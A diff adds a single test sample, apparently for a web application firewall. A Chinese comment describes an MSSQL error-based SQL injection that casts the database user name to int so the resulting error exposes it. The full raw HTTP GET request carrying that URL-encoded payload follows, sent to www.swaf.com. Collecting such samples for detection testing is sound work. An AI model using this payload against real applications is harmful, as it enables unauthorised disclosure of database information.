@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_报错注入-06506429
+# 攻击者基于报错查询，将"(select CAST(user as int))>0"语句注入到 SQL 查询参数中，使用as将char类型的user转换为int类型使数据库产生报错，从而暴露出user值。
+GET /?id=1%20%20and%20%28select%20CAST%28user%20as%20int%29%29%3E0&bid=hd_tag_m8mv26o1 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26o1
+RM-PRO-Token: 4f765ab41b0d59cf8ff1e0555ab888af
+RM-PRO-Time: 1742808643939
+User-Agent: curl/7.83.1
+
